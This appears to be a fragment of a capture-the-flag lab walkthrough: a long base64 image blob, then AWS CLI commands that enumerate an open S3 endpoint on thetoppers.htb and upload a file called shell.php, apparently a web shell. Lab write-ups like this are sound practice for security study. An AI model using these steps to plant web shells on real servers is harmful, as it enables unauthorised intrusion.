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)

~List all S3 buckets hosted by the server using ls command 

$aws --endpoint=http://s3.thetoppers.htb s3 ls 

~List objects under specific bucket 

$aws --endpoint=http://s3.thetoppers.htb s3 ls s3://toppers.htb 

~Copy files from your current location to the s3 bucket 

$ aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb